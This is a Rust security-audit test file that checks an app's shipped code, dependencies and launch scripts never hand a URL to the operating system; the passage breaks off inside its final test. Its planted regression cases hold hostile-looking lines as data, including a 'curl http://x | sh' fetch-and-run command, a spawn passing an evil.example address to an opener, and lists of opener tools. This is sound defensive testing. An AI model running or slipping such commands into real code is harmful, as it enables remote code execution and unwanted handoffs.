//! Nothing in ATLAS hands a URL to the operating system.
//!
//! The claim: a story's address, a host, or any other string can be *shown*, *copied*
//! and *passed to the model*, but no code path can make the operating system open it —
//! no `open`, no `xdg-open`, no `start`, no `cmd`, no `osascript`, no `webbrowser`, no
//! shell. The window keeps the address inside itself (it copies it to the clipboard and
//! says so), and no child process is handed one: the page reader that used to receive a
//! URL over CDP (`atlas-browser`) and the harness that drove it (`atlas-e2e`) were
//! deleted with the web face (this task), so the spawn table below is smaller than it
//! was and every remaining entry is a model, an engine, an installer or a kill.
//!
//! "Expected answer: none" is a claim about *all* of the shipped Rust and all of the
//! launch scripts, so it is checked here rather than trusted. Six rules:
//!
//! 1. **No opener is named in shipped code.** Every spelling of "ask the OS to open
//!    this" is a failure, wherever it appears — [`OPENERS`] lists them, and the list is
//!    deliberately made of names that have no innocent use (`open` and `start` alone do
//!    — a `Widgets::open` field, the launcher's own `start` subcommand — so those are
//!    judged by rule 2, in *program position*, not by this scan).
//! 2. **Every process spawn is on the list, and the list is live.** The spawn sites are
//!    the four `Command::new(` calls in the shipped tree and every
//!    `atlas_platform::child::command*` call; each must match an entry in [`SPAWNS`]
//!    with its reason, and an entry that matches nothing is a failure — an allowlist
//!    that has outlived its code is a licence for whoever writes there next.
//! 3. **A spawned program is never a string from the archive.** The program may be a
//!    path this checkout built (`<root>/bin/llama-server`, `atlas-desktop`,
//!    `atlas-monitor`, a rule engine) or one of two literal tool names
//!    (`cargo`, `cmake`, both in provisioning) — and never a URL, and never a variable
//!    named like one.
//! 4. **No child is handed a URL on its command line.** Any `http://`, `https://`,
//!    `file://`, `mailto:`, `javascript:` or `data:` literal inside a spawn statement is
//!    a failure. There is no browser child any more (`atlas-browser`, the page reader
//!    that took its pages over CDP, was deleted with the web face in this task), so the
//!    rule now covers the model, the engines and the installer, and nothing else.
//! 5. **The window copies an address; it never opens one.** `egui::Hyperlink` and
//!    `OutputCommand::OpenUrl` appear in no shipped file, and the one view that draws an
//!    address calls `link::openable` (the gate) and then `copy_text` (the action).
//! 6. **The OS opener is not compiled in at all.** `Cargo.lock` holds no `webbrowser` /
//!    `opener` / `open` crate, and `atlas-desktop` builds `eframe` with
//!    `default-features = false` — so `egui-winit`'s `links` feature is off and its
//!    `open_url_in_browser` is the `#[cfg(not(feature = "webbrowser"))]` branch that only
//!    logs (`egui-winit-0.37.0/src/lib.rs:1514-1524`). Even a stray `OpenUrl` cannot
//!    reach `NSWorkspace`/`xdg-open`/`ShellExecute` from this build.
//!
//! Rules 1–4 and 6 are backed by a planted regression: a synthetic [`SourceFile`], lock
//! file or script holding the attack, next to the assertion that the rule reports it.
//! The planted cases are how the rules were checked — revert one and the test that
//! plants the matching attack fails.
//!
//! Not covered, and why: the clipboard. It is the mechanism that replaces opening, so
//! what the reader pastes is the reader's decision, not the app's. (The retired web page
//! `public/ui/*.html` used to be excused here too; it is deleted, so the exception went.)
//!
//! Run it, with the counts printed:
//!
//! ```text
//! cargo test --offline --locked -p atlas-guard --test audit_open_url -- --nocapture
//! ```

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use atlas_guard::source::{find_spanned, find_wrapped, shipped_code, SourceFile};

fn rust_dir() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("..")
}

fn repo_dir() -> PathBuf {
    rust_dir().join("..")
}

/// The shipped Rust: every `*/src/**/*.rs`, test modules blanked, comments dropped by the
/// matchers. A file the compiler never sees (`tests/`, a `#[cfg(test)] mod`) is not here.
///
/// Read once per test binary: six tests each scan the whole tree, and the 466 files do
/// not change under them.
fn workspace() -> &'static [SourceFile] {
    static FILES: OnceLock<Vec<SourceFile>> = OnceLock::new();
    let files = FILES.get_or_init(|| {
        let files = shipped_code(&rust_dir());
        assert!(
            files.len() > 50,
            "the scanner read only {} files — the audit would pass on an empty tree",
            files.len()
        );
        files
    });
    files.as_slice()
}

fn read(path: &Path) -> String {
    std::fs::read_to_string(path).unwrap_or_default()
}

// ---------------------------------------------------------------- the opener names

/// Spellings that only ever mean "hand this to the OS". Each is checked with the comment
/// matcher, so a doc comment may *describe* the attack (this crate's own `link.rs` does,
/// at length) without being one.
const OPENERS: &[&str] = &[
    "xdg-open",
    "sensible-browser",
    "kde-open",
    "gio open",
    "osascript",
    "osacompile",
    "NSWorkspace",
    "ShellExecute",
    "webbrowser::",
    "opener::",
    "open::that",
    ".open_url(",
    "open_url_in_browser(",
    "OutputCommand::OpenUrl",
    "Hyperlink",
];

/// `OPENERS`, and where each hit is. Empty is the claim.
///
/// There is deliberately **no** reviewed-exception list here, and this is the one change
/// in this file that removes a mechanism rather than adding one: the audit used to carry
/// two entries for `atlas_platform::host::url_opener()`, a function that *looked up* the
/// OS opener for each platform and had no caller. That function is gone from the tree
/// (deleted, not renamed), so the entries went with it. A rule whose only entries are
/// about code that no longer exists is a licence for whoever writes in that file next:
/// the entries would keep matching nothing, and a *new* `url_opener()` — the one-line
/// handoff this whole audit exists to prevent — would be accepted as "the reviewed
/// lookup". Measured after the deletion: no opener spelling occurs anywhere in the
/// shipped tree (the count is printed by the test, not written down here — it moves as
/// other agents add files), so the honest table is empty, and every occurrence of every
/// spelling is now a finding, in every function of every file.
fn opener_findings(files: &[SourceFile]) -> Vec<String> {
    let mut out = Vec::new();
    for opener in OPENERS {
        for (path, line, function, text) in find_wrapped(files, opener, 1) {
            out.push(format!(
                "{path}:{line} in {function}(): {opener} — {text}"
            ));
        }
    }
    out
}

// ---------------------------------------------------------------- the spawn table

/// One spawn site the audit accepts: a file, the function that contains it, what it
/// starts, and why that cannot open a URL.
///
/// `function` is the function `atlas_guard::source::function_at` reports; an empty string
/// would mean the whole file, and no entry uses that — a function is the smallest thing a
/// reviewer can see.
struct Spawn {
    file: &'static str,
    function: &'static str,
    program: &'static str,
    why: &'static str,
}

/// Every process this workspace starts. The launcher's three children first (they are
/// what `atlas start` runs), then the boundary they and everything else goes through,
/// then the crates that start a child of their own, then the two harnesses.
const SPAWNS: &[Spawn] = &[
    Spawn {
        file: "atlas-launcher/src/llama.rs",
        function: "spawn",
        program: "<root>/bin/llama-server (Paths::llama_local), argv from llama::Invocation",
        why: "the model server: the launcher's first child, argv = --model <path>, --host 127.0.0.1, --port <u16>, context sizes — no string from the archive is in it",
    },
    Spawn {
        file: "atlas-launcher/src/window.rs",
        function: "launch",
        program: "atlas-desktop (Paths::release_dir, else PATH)",
        why: "the product's window: the launcher's second child, started with no arguments at all (`Command::new(&program)` then env/stdio)",
    },
    Spawn {
        file: "atlas-launcher/src/agent.rs",
        function: "launch",
        program: "atlas-monitor, one argument: `serve`",
        why: "the agent that claims the window's requests; the only argument is the literal subcommand",
    },
    Spawn {
        file: "atlas-launcher/src/setup.rs",
        function: "launch",
        program: "atlas-setup --install --root <root>",
        why: "the provisioner, started only when a piece is missing; both arguments are this checkout's own paths, and it installs, it never shows a page",
    },
    Spawn {
        file: "atlas-monitor/src/import_model.rs",
        function: "bring_in",
        program: "atlas-setup (release dir, else PATH), argv: `--import-model <the value the reader typed> --root <root>`",
        why: "the agent importing a model the reader already has: one attempt, curated environment, the root as cwd; the tool owns every rule about what a model may be and fetches only an https .gguf, and this crate passes the string and reports the tool's own sentence back (`docs §5.2`)",
    },
    Spawn {
        file: "atlas-platform/src/child.rs",
        function: "command_with",
        program: "the caller's program, through the workspace's one Command",
        why: "the boundary: env_clear() plus the curated allowlist, no shell, no console window on Windows; it decides the environment, not what runs (docs §4.9)",
    },
    Spawn {
        file: "atlas-launcher/src/child.rs",
        function: "capture",
        program: "the caller's program, for the launcher's `--version`/`--help` probes",
        why: "a program named by the caller (llama-server's own help), argv = the probe's arguments, stdout read back under a deadline; the launcher's other spawn path, and no shell",
    },
    Spawn {
        file: "atlas-launcher/src/child.rs",
        function: "politely",
        program: "/bin/kill or /usr/bin/kill, argv `-TERM <pid>`",
        why: "the polite half of stopping a child: a pid from this process's own `Child` handle, no shell, no libc; `kill(1)` is the only program this module runs with a pid",
    },
    Spawn {
        file: "atlas-ingest/src/rules/spawn.rs",
        function: "ask",
        program: "one engine at `<dir>/atlas-<engine>`",
        why: "the parity witness / out-of-process engines: argv is one op (`extract`, `place`, …), the payload arrives on stdin, stderr is dropped — no address is ever an argument",
    },
    Spawn {
        file: "atlas-search/src/rules.rs",
        function: "engine",
        program: "the same engine binaries, from atlas-search",
        why: "the same boundary and the same argv shape; `No shipped question travels this way` (spawn.rs)",
    },
    Spawn {
        file: "atlas-setup/src/install.rs",
        function: "run",
        program: "cargo (literal)",
        why: "`cargo --version`: a question about the toolchain, answered by cargo itself",
    },
    Spawn {
        file: "atlas-setup/src/llama.rs",
        function: "run",
        program: "cmake (literal)",
        why: "building llama.cpp once during provisioning; argv is flags and paths (`-B`, `-DCMAKE_BUILD_TYPE=…`), and the model file is the only input",
    },
    Spawn {
        file: "atlas-setup/src/llama.rs",
        function: "cmake_available",
        program: "cmake (literal)",
        why: "`cmake --version`, the availability probe for the line above",
    },
];

/// The needles that mark a spawn statement. `Command::new(` is the primitive; a
/// `child::command` call is a spawn with a curated environment.
const SPAWN_CALLS: &[&str] = &["Command::new(", "child::command(", "child::command_with("];

/// One spawn statement as the scanner sees it: where it is, and the joined text of the
/// statement (comments dropped by the scanner, strings kept).
struct Site {
    path: String,
    line: usize,
    function: String,
    text: String,
}

fn spawn_sites(files: &[SourceFile]) -> Vec<Site> {
    let mut out: Vec<Site> = Vec::new();
    for needle in SPAWN_CALLS {
        for (path, first, _last, _own, text) in find_spanned(files, needle, 3) {
            let function = files
                .iter()
                .find(|file| file.path == path)
                .map(|file| file.function_at(first))
                .unwrap_or_default();
            if out
                .iter()
                .any(|seen| seen.path == path && seen.line == first)
            {
                continue;
            }
            out.push(Site {
                path,
                line: first,
                function,
                text,
            });
        }
    }
    out.sort_by(|left, right| left.path.cmp(&right.path).then(left.line.cmp(&right.line)));
    out
}

fn allowlisted(site: &Site) -> Option<&'static Spawn> {
    SPAWNS.iter().find(|allowed| {
        allowed.file == site.path
            && (allowed.function.is_empty() || allowed.function == site.function)
    })
}

/// Spawn sites in no entry. Empty is the claim.
fn off_list_spawns(files: &[SourceFile]) -> Vec<String> {
    spawn_sites(files)
        .into_iter()
        .filter(|site| allowlisted(site).is_none())
        .map(|site| {
            format!(
                "{}:{} in {}() — a spawn this audit has no entry for: {}",
                site.path, site.line, site.function, site.text
            )
        })
        .collect()
}

/// Entries that match no site: a review decision about code that has moved. Empty is the
/// claim.
fn stale_entries(files: &[SourceFile]) -> Vec<String> {
    let sites = spawn_sites(files);
    SPAWNS
        .iter()
        .filter(|allowed| {
            !sites.iter().any(|site| {
                allowed.file == site.path
                    && (allowed.function.is_empty() || allowed.function == site.function)
            })
        })
        .map(|allowed| {
            format!(
                "{}  {}() — allowed in the table but found in no ship'd file",
                allowed.file, allowed.function
            )
        })
        .collect()
}

// ------------------------------------------------------- a program is never a URL

/// The argument of a `Command::new(`/`child::command(` call, as written.
fn program_of(text: &str) -> String {
    let at = ["Command::new(", "child::command_with(", "child::command("]
        .iter()
        .filter_map(|needle| text.find(needle).map(|at| (at, needle.len())))
        .next();
    let Some((at, len)) = at else {
        return String::new();
    };
    let rest = &text[at + len..];
    let mut depth = 0_i32;
    let mut out = String::new();
    for ch in rest.chars() {
        match ch {
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => {
                if depth == 0 {
                    break;
                }
                depth -= 1;
            }
            ',' if depth == 0 => break,
            _ => {}
        }
        out.push(ch);
    }
    out.trim().to_string()
}

/// Names that could carry a string this app did not write. A program named after one of
/// these is an address being run, whatever it points at.
const ADDRESS_WORDS: &[&str] = &[
    "url", "href", "link", "address", "origin", "needle", "query", "text", "body", "html",
    "input", "payload", "title", "name", "arg", "user",
];

/// The literal program names a spawn may use, and what each is for. A literal is a
/// decision written in the source; an expression is a decision made by the caller, and
/// the spawn table covers those.
///
/// `lsof` was here until this task: its only caller was `atlas-e2e`'s port inventory,
/// and that crate is deleted. A tool name kept in this list after its caller is gone
/// is an allowed spawn nobody asked for.
const LITERAL_PROGRAMS: &[(&str, &str)] = &[
    ("cargo", "atlas-setup's `cargo --version`"),
    ("cmake", "atlas-setup building llama.cpp once, and its availability probe"),
];

fn address_programs(files: &[SourceFile]) -> Vec<String> {
    let mut out = Vec::new();
    for site in spawn_sites(files) {
        let program = program_of(&site.text);
        if program.is_empty() {
            out.push(format!(
                "{}:{} — a spawn whose program could not be read: {}",
                site.path, site.line, site.text
            ));
            continue;
        }
        // A literal is a decision made here; anything else must be one of this checkout's
        // own paths and is already judged by the allowlist.
        if program.starts_with('"') {
            let literal = program.trim_matches('"');
            if !LITERAL_PROGRAMS.iter().any(|(name, _)| *name == literal) {
                out.push(format!(
                    "{}:{} — the program is the literal {literal:?}, which is not a tool this table knows",
                    site.path, site.line
                ));
            }
            continue;
        }
        if program.contains("://") {
            out.push(format!(
                "{}:{} — the program is an address: {program}",
                site.path, site.line
            ));
        }
        let bare = program
            .trim_start_matches('&')
            .trim_start_matches('*')
            .to_string();
        let lowers = bare.to_lowercase();
        if ADDRESS_WORDS
            .iter()
            .any(|word| lowers == *word || lowers.ends_with(&format!(".{word}")))
        {
            out.push(format!(
                "{}:{} — the program is a variable named like stored text: {program}",
                site.path, site.line
            ));
        }
    }
    out
}

// ---------------------------------------------- a child never receives an address

/// Every spelling of a URL that would be meaningful to an OS. `about:blank` is absent on
/// purpose: it is the browser's own empty page, not a destination.
const URL_SCHEMES: &[&str] = &[
    "http://", "https://", "file://", "mailto:", "javascript:", "data:text", "data:image",
];

/// Words that name stored text. An `arg` built from one of these is a handoff even when
/// no scheme is written next to it: `Command::new("open").arg(url)` never spells
/// `https://`, and is the attack this rule is for.
const ADDRESS_ARGUMENTS: &[&str] = &["url", "href", "address", "origin", "link"];

fn url_arguments(files: &[SourceFile]) -> Vec<String> {
    let mut out = Vec::new();
    for needle in [".arg(", ".args(", ".spawn()"] {
        for (path, first, _last, own, text) in find_spanned(files, needle, 2) {
            let found: Vec<&str> = URL_SCHEMES
                .iter()
                .copied()
                .filter(|scheme| text.contains(scheme) || own.contains(scheme))
                .collect();
            if !found.is_empty() {
                out.push(format!(
                    "{}:{} — a command line carrying {}: {text}",
                    path,
                    first,
                    found.join(", ")
                ));
                continue;
            }
            // `arg(&url)`, `arg(url)`, `args([url])`: the argument is an address by name.
            let argument = argument_of(&text);
            let bare = argument
                .trim_start_matches('"')
                .trim_end_matches('"')
                .trim_start_matches('&')
                .trim()
                .to_string();
            if ADDRESS_ARGUMENTS.iter().any(|word| bare == *word) {
                out.push(format!(
                    "{}:{} — a child is handed the address stored in `{bare}`: {text}",
                    path, first
                ));
            }
        }
    }
    out
}

/// The first argument of the first `.arg(` in `text`, as written (`&url`, `url`, `"x"`).
fn argument_of(text: &str) -> String {
    let Some(at) = text.find(".arg(") else {
        return String::new();
    };
    let rest = &text[at + ".arg(".len()..];
    rest.split(')').next().unwrap_or("").trim().to_string()
}

// --------------------------------------------- what the window does with an address

fn hyperlink_findings(files: &[SourceFile]) -> Vec<String> {
    let mut out = Vec::new();
    for (path, line, function, text) in find_wrapped(files, "Hyperlink", 1) {
        out.push(format!("{path}:{line} in {function}(): {text}"));
    }
    for (path, line, function, text) in find_wrapped(files, "OpenUrl", 1) {
        out.push(format!("{path}:{line} in {function}(): {text}"));
    }
    out
}

// ------------------------------------------------ the OS opener is not compiled in

/// Crates that exist to hand a URL to the desktop environment. Their absence from
/// `Cargo.lock` is the structural half of the proof: the handler that would call them is
/// compiled to a `log::warn` instead.
const OPENER_CRATES: &[&str] = &["webbrowser", "opener", "open", "open-rs", "xdg", "urlopen"];

fn lock_findings(lock: &str) -> Vec<String> {
    let mut out = Vec::new();
    for line in lock.lines() {
        let line = line.trim();
        let Some(rest) = line.strip_prefix("name = \"") else {
            continue;
        };
        let name = rest.trim_end_matches('"');
        if OPENER_CRATES.contains(&name) {
            out.push(format!(
                "Cargo.lock pulls the opener crate {name:?} — whichever crate asks for it can hand a URL to the OS"
            ));
        }
    }
    out
}

/// `atlas-desktop` must build `eframe` without default features: `links` (which is what
/// compiles `webbrowser` into `egui-winit`) is a non-default feature of that stack here,
/// and turning defaults back on would silently re-arm `open_url_in_browser`.
fn eframe_is_minimal(manifest: &str) -> Vec<String> {
    let mut out = Vec::new();
    let line = manifest
        .lines()
        .find(|line| line.trim_start().starts_with("eframe"))
        .unwrap_or("");
    if line.is_empty() {
        out.push("atlas-desktop/Cargo.toml has no eframe dependency line".to_string());
        return out;
    }
    if !line.contains("default-features = false") {
        out.push(format!(
            "atlas-desktop/Cargo.toml builds eframe with its default features ({line}); \
             `links`/`webbrowser` is how `OpenUrl` reaches the OS opener"
        ));
    }
    out
}

// ------------------------------------------------------------- the launch scripts

/// The scripts a person double-clicks. They are not Rust, and they ship.
const SCRIPTS: &[&str] = &[
    "ATLAS.sh",
    "ATLAS.command",
    "ATLAS.bat",
    "ATLAS.ps1",
    "run.sh",
    "run.ps1",
    "setup.sh",
    "setup.ps1",
    "rust/build.sh",
    "rust/build-ui.sh",
];

/// Verbs that make a line a message to the human rather than a command. A URL inside one
/// of these is the app *telling* the reader where to go; that is the opposite of opening
/// it for them.
const MESSAGE_VERBS: &[&str] = &[
    "echo", "say", "printf", "write-host", "log ", "die ", "die\"", "warn", "note", "rem ",
];

/// A first token a script may run, with the reason. `ATLAS.bat` is four lines that hand
/// the double-click to the PowerShell launcher beside it — the same file a reader would
/// run by hand, not a shell prompt and not an opener.
struct ScriptSpawn {
    file: &'static str,
    first: &'static str,
    why: &'static str,
}

const SCRIPT_SPAWNS: &[ScriptSpawn] = &[ScriptSpawn {
    file: "ATLAS.bat",
    first: "powershell",
    why: "`powershell -NoProfile -ExecutionPolicy Bypass -File \"%~dp0ATLAS.ps1\" %*` — the sibling launcher this checkout ships, named from the .bat's own directory; the arguments are that path and the double-click's own, and ATLAS.ps1 is scanned by this same rule",
}];

fn script_findings(scripts: &[(String, String)]) -> Vec<String> {
    let mut out = Vec::new();
    for (name, text) in scripts {
        for (index, raw) in text.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty() {
                continue;
            }
            let lower = line.to_lowercase();
            let is_message = MESSAGE_VERBS
                .iter()
                .any(|verb| lower.starts_with(verb) || lower.contains(&format!("|| {verb}")));
            if is_message {
                continue;
            }
            // Comments: `#`, `rem`, and PowerShell's `#` too.
            if lower.starts_with('#') || lower.starts_with("::") {
                continue;
            }
            let first = lower.split_whitespace().next().unwrap_or("");
            let opener = matches!(
                first,
                "open" | "xdg-open" | "gio" | "kde-open" | "sensible-browser" | "osascript"
                    | "start" | "cmd" | "cmd.exe" | "powershell" | "pwsh" | "webbrowser"
            );
            if opener {
                let allowed = SCRIPT_SPAWNS
                    .iter()
                    .any(|spawn| spawn.file == name && spawn.first == first);
                if !allowed {
                    out.push(format!(
                        "{name}:{} — the script runs {first}: {line}",
                        index + 1
                    ));
                }
            }
            // A URL that is not part of a message is a URL being fetched, which is the
            // same handoff by another road.
            if line.contains("http://") || line.contains("https://") {
                if !MESSAGE_VERBS
                    .iter()
                    .any(|verb| lower.contains(verb))
                {
                    out.push(format!(
                        "{name}:{} — an address outside a message line: {line}",
                        index + 1
                    ));
                }
            }
        }
    }
    out
}

// ------------------------------------------------------------------------- tests

/// Rule 1. Prose may describe the attack (`atlas-desktop/src/link.rs` does, in detail);
/// compiled code may not contain it.
#[test]
fn no_opener_and_no_shell_is_named_in_shipped_code() {
    let files = workspace();
    let findings = opener_findings(files);
    eprintln!(
        "spellings checked: {}; files scanned: {}; findings: {}",
        OPENERS.len(),
        files.len(),
        findings.len()
    );
    assert!(
        findings.is_empty(),
        "shipped code names an OS opener:\n{}",
        findings.join("\n")
    );
    // This audit no longer carries a single reviewed exception (see [`opener_findings`]):
    // the one it had, an unused opener lookup in `atlas-platform`, was deleted from the
    // tree. The rule that entry protected still bites, and this case is *why* an
    // exception list keyed on a function name was the wrong mechanism: here the opener is
    // reached through a helper called `reach`, not through any name a list could hold, and
    // the spelling is caught where it is *written*.
    let through_helper = vec![SourceFile {
        path: "atlas-attack/src/handoff.rs".to_string(),
        code: r#"fn reach() -> &'static str { "xdg-open" }
fn handle_click(url: &str) { let _ = std::process::Command::new(reach()).arg(url).spawn(); }"#
            .to_string(),
    }];
    assert!(
        !opener_findings(&through_helper).is_empty(),
        "an opener reached through an innocuous helper was not reported"
    );

    // A planted regression per shape: if the rule stops seeing these, the test above is
    // passing for the wrong reason.
    for attack in [
        r#"fn f() { let _ = std::process::Command::new("xdg-open").arg(url).spawn(); }"#,
        r#"fn f() { webbrowser::open(&url); }"#,
        r#"fn f(url: &str) { opener::open(url); }"#,
        r#"fn f() { let _ = std::process::Command::new("osascript").arg("-e").arg(script); }"#,
        r#"fn f() { let _ = ShellExecuteW(std::ptr::null(), wide("open"), url, ptr::null(), ptr::null(), 1); }"#,
    ] {
        let planted = vec![SourceFile {
            path: "atlas-attack/src/handoff.rs".to_string(),
            code: attack.to_string(),
        }];
        assert!(
            !opener_findings(&planted).is_empty(),
            "the opener scan missed a planted attack: {attack}"
        );
    }
}

/// Rule 2. Every spawn is a reviewed entry, and every entry is still there.
#[test]
fn every_process_spawn_is_on_the_list_and_the_list_is_live() {
    let files = workspace();
    let sites = spawn_sites(files);
    let off = off_list_spawns(files);
    let stale = stale_entries(files);

    eprintln!("spawn sites found: {}", sites.len());
    for site in &sites {
        let allowed = allowlisted(site);
        eprintln!(
            "  {}:{}  {}()  →  {}",
            site.path,
            site.line,
            site.function,
            allowed
                .map(|allowed| allowed.program)
                .unwrap_or("NOT ON THE LIST")
        );
        if let Some(allowed) = allowed {
            eprintln!("      because: {}", allowed.why);
        }
    }
    eprintln!(
        "entries: {}; off-list sites: {}; entries matching nothing: {}",
        SPAWNS.len(),
        off.len(),
        stale.len()
    );

    assert!(
        off.is_empty(),
        "a process is started from a site this audit does not know:\n{}",
        off.join("\n")
    );
    assert!(
        stale.is_empty(),
        "an allowlist entry no longer matches code:\n{}",
        stale.join("\n")
    );
    assert!(
        sites.len() >= SPAWNS.len(),
        "{} sites for {} entries — a whole file of spawns went missing",
        sites.len(),
        SPAWNS.len()
    );

    // The launcher's children are the three the product starts, and each says what it is.
    for (file, function, program) in [
        ("atlas-launcher/src/llama.rs", "spawn", "llama-server"),
        ("atlas-launcher/src/window.rs", "launch", "atlas-desktop"),
        ("atlas-launcher/src/agent.rs", "launch", "atlas-monitor"),
    ] {
        let entry = SPAWNS
            .iter()
            .find(|entry| entry.file == file && entry.function == function)
            .unwrap_or_else(|| panic!("{file}: {function}() is not on the list"));
        assert!(
            entry.program.contains(program),
            "{file}: {function}() starts {program}, but the table says {}",
            entry.program
        );
    }

    // Planted: a spawn in a crate that is not on the list is caught.
    let planted = vec![SourceFile {
        path: "atlas-attack/src/handoff.rs".to_string(),
        code: r#"fn f() { let _ = std::process::Command::new("open").arg(url).spawn(); }"#.to_string(),
    }];
    assert!(
        !off_list_spawns(&planted).is_empty(),
        "a spawn outside the table was not reported"
    );
    // Planted: an entry whose code moved is caught by the same rule.
    let gone = vec![SourceFile {
        path: "atlas-unrelated/src/nothing.rs".to_string(),
        code: "fn quiet() {}\n".to_string(),
    }];
    assert!(
        !stale_entries(&gone).is_empty(),
        "the liveness half never fires: an empty tree still satisfies every entry"
    );
}

/// Rule 3. A program is a path this checkout built or one of two tools — never text.
#[test]
fn a_spawned_program_is_never_an_address() {
    let files = workspace();
    let findings = address_programs(files);
    eprintln!("findings: {}", findings.len());
    assert!(
        findings.is_empty(),
        "a spawn runs something that came from stored text:\n{}",
        findings.join("\n")
    );

    for (attack, why) in [
        (
            r#"fn f(url: &str) { let _ = std::process::Command::new(url).spawn(); }"#,
            "a program that is a URL parameter",
        ),
        (
            r#"fn f() { let _ = std::process::Command::new("https://example.com/install.sh").spawn(); }"#,
            "an address used as the program",
        ),
        (
            r#"fn f() { let _ = atlas_platform::child::command("open"); }"#,
            "a literal program this table does not know",
        ),
    ] {
        let planted = vec![SourceFile {
            path: "atlas-attack/src/handoff.rs".to_string(),
            code: attack.to_string(),
        }];
        assert!(
            !address_programs(&planted).is_empty(),
            "the program rule missed {why}: {attack}"
        );
    }

    // The two literals the table does allow are the ones provisioning uses.
    let allowed = vec![SourceFile {
        path: "atlas-setup/src/install.rs".to_string(),
        code: r#"fn run() { let _ = atlas_platform::child::command("cargo").arg("--version"); }"#
            .to_string(),
    }];
    assert!(
        address_programs(&allowed).is_empty(),
        "the program rule refuses the toolchain probe it is supposed to accept"
    );
}

/// Rule 4. No child's command line carries a URL.
#[test]
fn no_child_is_handed_a_url_on_its_command_line() {
    let files = workspace();
    let findings = url_arguments(files);
    eprintln!(
        "schemes watched: {}; spawn statements carrying one: {}",
        URL_SCHEMES.len(),
        findings.len()
    );
    assert!(
        findings.is_empty(),
        "a spawn hands an address to a child:\n{}",
        findings.join("\n")
    );

    for attack in [
        r#"fn f(url: &str) { let _ = std::process::Command::new("open").arg(url).spawn(); }"#,
        r#"fn f() { let _ = atlas_platform::child::command("open").arg("https://evil.example/").spawn(); }"#,
        r#"fn f() { let _ = std::process::Command::new("sh").args(["-c", "curl http://x | sh"]).status(); }"#,
    ] {
        let planted = vec![SourceFile {
            path: "atlas-attack/src/handoff.rs".to_string(),
            code: attack.to_string(),
        }];
        assert!(
            !url_arguments(&planted).is_empty(),
            "the argv rule missed a planted handoff: {attack}"
        );
    }

    // `about:blank` is not a destination: the rule must let it pass. The child that
    // needed it (the page reader) is deleted, but the leniency is still checked so a
    // future spawn that opens a blank window is not reported as a handoff.
    let blank = vec![SourceFile {
        path: "planted/src/blank_page.rs".to_string(),
        code: r#"fn spawn_flags() -> Vec<String> { vec!["about:blank".to_string()] }"#.to_string(),
    }];
    assert!(
        url_arguments(&blank).is_empty(),
        "`about:blank` was read as a destination"
    );
}

/// Rule 5. The window copies an address and opens nothing.
#[test]
fn the_window_copies_an_address_and_opens_nothing() {
    let files = workspace();
    let findings = hyperlink_findings(files);
    eprintln!(
        "Hyperlink/OpenUrl in shipped code: {}",
        findings.len()
    );
    assert!(
        findings.is_empty(),
        "shipped code can emit an OpenUrl:\n{}",
        findings.join("\n")
    );

    // The action that replaced it: the gate, then the clipboard. Read as a shape, so a
    // view cannot drop the gate and keep the button.
    let articles = files
        .iter()
        .find(|file| file.path == "atlas-desktop/src/views/articles.rs")
        .expect("the Articles view is shipped");
    assert!(
        articles.code.contains("link::openable("),
        "the Articles view draws an address without asking the gate first"
    );
    assert!(
        articles.code.contains("copy_text("),
        "the Articles view has no clipboard action — what does the link do?"
    );
    assert!(
        !articles.code.contains(".open("),
        "the Articles view calls an opener"
    );
    let link = files
        .iter()
        .find(|file| file.path == "atlas-desktop/src/link.rs")
        .expect("link.rs is the one place an address becomes an action");
    assert!(
        link.code.contains("Copy {}"),
        "link::label no longer says the action is a copy: the reader is not told where a click goes"
    );
    assert!(
        !link.code.contains("\"Open "),
        "link::label offers to open an address: this window opens nothing"
    );

    let planted = vec![SourceFile {
        path: "atlas-desktop/src/views/articles.rs".to_string(),
        code: r#"fn show(ui: &mut egui::Ui) { ui.add(egui::Hyperlink::from_label_and_url("here", url)); }"#
            .to_string(),
    }];
    assert!(
        !hyperlink_findings(&planted).is_empty(),
        "the hyperlink rule missed a planted Hyperlink"
    );
}

/// Rule 6. The opener is not in the dependency graph at all.
#[test]
fn the_os_opener_is_not_compiled_into_the_lock() {
    let lock = read(&rust_dir().join("Cargo.lock"));
    assert!(
        lock.len() > 1000,
        "Cargo.lock was not read ({} bytes) — the audit would pass on an empty file",
        lock.len()
    );
    let findings = lock_findings(&lock);
    let packages = lock
        .lines()
        .filter(|line| line.trim().starts_with("name = \""))
        .count();
    eprintln!(
        "packages in Cargo.lock: {packages}; opener crates: {}",
        findings.len()
    );
    assert!(
        findings.is_empty(),
        "a crate that opens URLs is in the build:\n{}",
        findings.join("\n")
    );

    let manifest = read(&rust_dir().join("atlas-desktop").join("Cargo.toml"));
    let minimal = eframe_is_minimal(&manifest);
    eprintln!("eframe feature findings: {}", minimal.len());
    assert!(
        minimal.is_empty(),
        "{}",
        minimal.join("\n")
    );

    // Planted: the crate arrives, and the audit sees it.
    let planted = "[[package]]\nname = \"webbrowser\"\nversion = \"1.0.0\"\n";
    assert!(
        !lock_findings(planted).is_empty(),
        "the lock scan did not see a webbrowser package"
    );
    // Planted: default features come back on the line that draws the window.
    let planted = "eframe = { version = \"=0.37.0\", features = [\"default_fonts\", \"glow\"] }\n";
    assert!(
        !eframe_is_minimal(planted).is_empty(),
        "the manifest rule did not see eframe's default features"
    );
}

/// Rule 7. The scripts that start the app run no opener and fetch nothing.
#[test]
fn the_launch_scripts_run_no_opener_and_open_no_address() {
    let root = repo_dir();
    let mut scripts: Vec<(String, String)> = Vec::new();
    for name in SCRIPTS {
        let text = read(&root.join(name));
        if !text.is_empty() {
            scripts.push(((*name).to_string(), text));
        }
    }
    assert!(
        scripts.len() >= 8,
        "read only {} of {} launch scripts — the audit would pass on a missing tree",
        scripts.len(),
        SCRIPTS.len()
    );
    let findings = script_findings(&scripts);
    let urls: usize = scripts
        .iter()
        .map(|(_, text)| text.matches("https://").count() + text.matches("http://").count())
        .sum();
    eprintln!(
        "scripts read: {}; address mentions: {urls} (all inside messages); findings: {}",
        scripts.len(),
        findings.len()
    );
    for spawn in SCRIPT_SPAWNS {
        eprintln!("  allowed: {} runs {}\n    {}", spawn.file, spawn.first, spawn.why);
    }
    assert!(
        findings.is_empty(),
        "a launch script opens or fetches something:\n{}",
        findings.join("\n")
    );

    for attack in [
        "open \"https://example.com\"\n",
        "xdg-open \"$url\"\n",
        "cmd /c start https://example.com\n",
        "osascript -e 'open location \"https://example.com\"'\n",
